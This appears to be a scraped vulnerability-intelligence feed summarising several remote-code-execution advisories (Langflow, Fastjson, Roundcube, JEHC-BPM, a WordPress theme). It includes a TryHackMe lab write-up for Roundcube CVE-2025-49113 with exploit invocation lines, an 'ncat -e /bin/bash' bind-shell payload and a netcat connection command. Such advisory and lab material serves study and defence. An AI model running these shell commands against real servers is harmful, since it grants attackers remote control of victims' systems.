entry.title: Langflow Unauth RCE
entry.content:
链接： https://github.com/advisories/GHSA-rvqx-wpfh-mfx7

仓库 Star： 74752

参考链接：

  • https://github.com/langflow-ai/langflow/security/advisories/GHSA-rvqx-wpfh-mfx7

  • https://nvd.nist.gov/vuln/detail/CVE-2025-3248

  • https://github.com/langflow-ai/langflow/pull/6911

  • https://github.com/langflow-ai/langflow/commit/faac4db133de32fcb6d483fa9ff52f40ce42bdc0

  • https://github.com/langflow-ai/langflow/releases/tag/1.3.0

  • https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai

  • https://github.com/advisories/GHSA-rvqx-wpfh-mfx7

描述：

Langflow versions prior to 1.3.0 are susceptible to code injection in the /api/v1/validate/code endpoint. A remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code.
entry.summary: 链接： https://github.com/advisories/GHSA-rvqx-wpfh-mfx7

entry.title: Fastjson 反序列化远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： Fastjson 反序列化远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2017-18349

漏洞类型： 反序列化

漏洞等级： 严重

漏洞描述： Fastjson在1.2.25版本之前存在一个远程代码执行漏洞，该漏洞允许攻击者通过精心构造的JSON请求，利用恶意的@type注解触发JdbcRowSetImpl的不安全反序列化，从而执行任意代码。此漏洞影响了Pippo 1.11.0中的FastjsonEngine以及其他使用易受攻击Fastjson版本的产品。成功利用此漏洞可能导致系统完全被攻陷，攻击者可以执行任意命令、访问敏感数据并在目标系统上建立持久后门。

产品厂商： alibaba

产品名称： fastjson

影响版本： version < 1.2.25

来源： https://github.com/projectdiscovery/nuclei-templates/blob/273970a87fd4961990cf390639c9db173092d040/http%2Fcves%2F2017%2FCVE-2017-18349.yaml

类型： projectdiscovery/nuclei-templates:github issues

POC详情
entry.summary:
漏洞信息

漏洞名称： Fastjson 反序列化远程代码执行漏洞

漏洞

entry.title: Fastjson 反序列化漏洞
entry.content:
漏洞信息

漏洞名称： Fastjson 反序列化漏洞

漏洞编号：

  • CVE： CVE-2017-18349

漏洞类型： 反序列化

漏洞等级： 严重

漏洞描述： Fastjson 1.2.25之前的版本存在远程代码执行漏洞，由于parseObject中的不安全反序列化，远程攻击者可以通过发送恶意的JSON数据到/json端点来执行任意代码。

产品名称： Fastjson

影响版本： version < 1.2.25

来源： https://github.com/projectdiscovery/nuclei-templates/issues/12387

类型： projectdiscovery/nuclei-templates:github issues

来源概述

Description:

Fastjson before 1.2.25 contains a remote code execution caused by unsafe deserialization in parseObject, letting remote attackers execute arbitrary code via crafted JSON data, exploit requires sending malicious JSON payload to /json endpoint.

Severity: Critical
POC:
  • https://github.com/pippo-java/pippo/issues/466
  • https://github.com/h0cksr/Fastjson--CVE-2017-18349-

KEV: True

Shodan Query: NA

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.
entry.summary:
漏洞信息

漏洞名称： Fastjson 反序列化漏洞

漏洞编号：

entry.title: Roundcube RCE Vulnerability
entry.content:
漏洞信息

漏洞名称： Roundcube RCE Vulnerability

漏洞编号：

  • CVE： CVE-2025-49113

漏洞类型： 反序列化

漏洞等级： 高危

漏洞描述： Roundcube邮件系统中存在一个反序列化漏洞，允许攻击者在登录后执行远程命令。受影响的版本包括1.5.10及以下和1.6.10及以下。漏洞源于program/actions/settings/upload.php文件中session->append()函数的使用未进行充分验证，导致攻击者可以通过构造特定的_from参数注入恶意对象，进而在服务器上执行任意代码。

产品厂商： Roundcube

产品名称： Roundcube

影响版本： ≤ 1.5.10 / 1.6.10

来源： https://github.com/5kr1pt/Roundcube_CVE-2025-49113

类型： CVE-2025:github search

仓库文件

  • README.md
  • images

来源概述

RCE no Roundcube (CVE-2025-49113) - Minha anotação do Obsidian .md

1750185929757

Status: Completed

Tags: [[RCE]] | [[PHP]] | [[LAB]] | [[EXPLOIT]] | [[CVE]]

by KRPT Paulo G. Werneck - Linkedin - in.com/pgw-script

Impacto: execução remota de comandos pós-login (CVSS 9.9)
Versões afetadas: ≤ 1.5.10 / 1.6.10
Patched: 1.5.11 e 1.6.11

1 – Timeline

DataEvento
~2014Introdução da rota program/actions/settings/upload.php com uso de session->append() sem validação.
03 jun 2025Pesquisadores da @FearsOff publicam o advisory e anunciam PoC.
04 jun 2025Roundcube aplica commit 0376f69 (1.6-stable) e commit 7408f31 (1.5-lts).
06 jun 2025PoC publicada no github . (fearsoff-org/CVE-2025-49113)
10 jun 2025Exploração em massa.

2 – Onde estava o problema

Código vulnerável (1.6.10)

A entrada _from chega completa do GET dps vira parte do nome de um nó na sessão e
durante o primeiro append(), o Roundcube faz:

Se o arquivo existir, o RCE funcionou.

6 – Mitigações

  1. Atualize imediatamente para ≥ 1.6.11 ou ≥ 1.5.11.

  2. Cao nao consiga atualizar, bloqueie qualquer _from contendo %22, %7C, !, . ou bytes de controle via WAF, firewall ou rewrite.

  3. Desative funções perigosas (proc_open, exec, etc.) em php.ini.

  4. Bloqueie uploads no painel de configurações e monitore logs.

7 - Lab - TryHackme - WriteUp

1. Recon

  1. Abrir a VM (MACHINE_IP) e o AttackBox.

  2. Acessar http://MACHINE_IP/roundcube com:

    usuário: ellieptic
    senha: ChangeMe123

    Isso vai funcionar e vai logar normalmente:

2. Montar o exploit

Após verificar que está tudo up, vamos executar o exploit, para isso vamos acessar a PoC postada no github informada anteriormente e fazer um gitclone:

3. Preparar o payload

O uso do payload é simples, basta criar o bind shell e apontar para uma porta com o file .php seguindo o usage abaixo:

php CVE-2025-49113.php <site> <user> <senha> “<bind shell>”

php CVE-2025-49113.php http://MACHINE_IP/roundcube ellieptic ChangeMe123 "ncat -lvnp 1337 -e /bin/bash"

– O script faz login, injeta o objeto PHP malicioso no parâmetro _from, conforme falamos anteriormente, chama o endpoint upload.php e depois força logout para disparar
session_decode() → unserialize() → proc_open().

Às vezes ele mostra erro de CSRF; ignore e siga para o próximo passo,
porque o comando costuma ter sido executado mesmo assim.

4. Conectar na shell

Se a bind shell deu certo, ela ta escutando na porta 1337 que passamos, so fazermos a conexão nela agora:

nc MACHINE_IP 1337

Shell obtida.

5. Respondendo as questões

Questões e respostas

  1. Usuário Maggie
    Pergunta: Um dos usuários tem o primeiro nome Maggie. Qual é o sobrenome dela?
    Resposta: Byte

Para resolver essa questão podiamos dar um cat em /etc/passwd grepando o usuário da maggie, ou simplesmente dando um lsem /home

  1. Flag em /etc
    Pergunta: Qual é o valor do sinalizador salvo em /etc?
    Resposta: THM{ICE_CUBE_DESERIALISATION}

Para resolver isso, dei um cat /etc/flag* e por sorte o nome do arquivo era flag e com isso conseguimos capturar.

7 – Referências

  • Commit 1.6.11 – https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d

  • Commit 1.5.11 – https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695

  • FearsOff write-up – https://fearsoff.org/research/roundcube

  • OffSec blog – https://www.offsec.com/blog/cve-2025-49113/ offsec.com

  • TryHackme - TryHackMe | Roundcube: CVE-2025-49113

  • GHSA advisory – https://github.com/advisories/GHSA-8j8w-wwqc-x596 github.com

漏洞信息

漏洞名称： Roundcube RCE Vulnerability

entry.title: JEHC-BPM 远程代码执行漏洞
entry.content:
漏洞信息

漏洞名称： JEHC-BPM 远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2025-45854

漏洞类型： 命令执行

漏洞等级： 严重

漏洞描述： JEHC-BPM的/server/executeExec组件中存在远程命令执行漏洞，攻击者可以利用此漏洞执行任意代码。该漏洞的存在是由于executeExec端点的授权检查不足，允许直接执行命令。

产品名称： JEHC-BPM

影响版本： <= v2.0.1

搜索语法： body=”JEHC”

entry.title: Unrestricted Upload of File with Dangerous Type vulnerability in NasaTheme Flozen allows Upload a
entry.content:
链接： https://github.com/advisories/GHSA-f4mc-8m8c-7xfc

CVSS 评分： 10.0

参考链接：

  • https://nvd.nist.gov/vuln/detail/CVE-2025-49071

  • https://patchstack.com/database/wordpress/theme/flozen-theme/vulnerability/wordpress-flozen-1-5-1-arbitrary-file-upload-vulnerability?_s_id=cve

  • https://github.com/advisories/GHSA-f4mc-8m8c-7xfc

描述：

Unrestricted Upload of File with Dangerous Type vulnerability in NasaTheme Flozen allows Upload a Web Shell to a Web Server. This issue affects Flozen: from n/a through n/a.

entry.content:
